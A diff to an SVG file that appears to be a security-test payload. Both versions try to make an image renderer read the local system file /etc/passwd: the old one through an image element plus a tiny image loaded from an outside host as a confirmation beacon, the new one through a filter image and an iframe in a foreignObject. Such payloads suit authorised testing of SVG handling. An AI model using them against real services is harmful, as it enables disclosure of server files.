@@ -1,23 +1,34 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-   <defs>
-     <image id="test" xlink:href="file:///etc/passwd" width="100" height="100"/>
-   </defs>
-   
-   <rect width="300" height="100">
-     <animate 
-       attributeName="fill"
-       values="red;green;blue;red"
-       dur="2s"
-       repeatCount="indefinite"/>
-     <animate
-       attributeName="x"
-       values="0;50;0"
-       dur="2s"
-       repeatCount="indefinite"/>
-   </rect>
-   
-   <use xlink:href="#test" x="0" y="0"/>
-   <image xlink:href="https://mtrf3.github.io/finding/confirm.png" x="0" y="0" width="1" height="1"/>
+    <defs>
+        <filter id="filter">
+            <feImage xlink:href="file:///etc/passwd" x="0" y="0" width="100%" height="100%"/>
+            <feFlood flood-color="red"/>
+            <feMerge>
+                <feMergeNode/>
+                <feMergeNode/>
+            </feMerge>
+        </filter>
+        
+        <filter id="animate">
+            <feColorMatrix type="hueRotate">
+                <animate attributeName="values"
+                         values="0;360;0"
+                         dur="3s"
+                         repeatCount="indefinite"/>
+            </feColorMatrix>
+        </filter>
+    </defs>
+    
+    <rect width="300" height="100" fill="blue" filter="url(#animate)">
+        <set attributeName="filter" to="url(#filter)" begin="click"/>
+    </rect>
+    
+    <!-- Try to embed external content via foreignObject -->
+    <foreignObject width="100%" height="100%">
+        <iframe xmlns="http://www.w3.org/1999/xhtml" 
+                src="file:///etc/passwd" 
+                style="width:100%;height:100%"/>
+    </foreignObject>
 </svg>
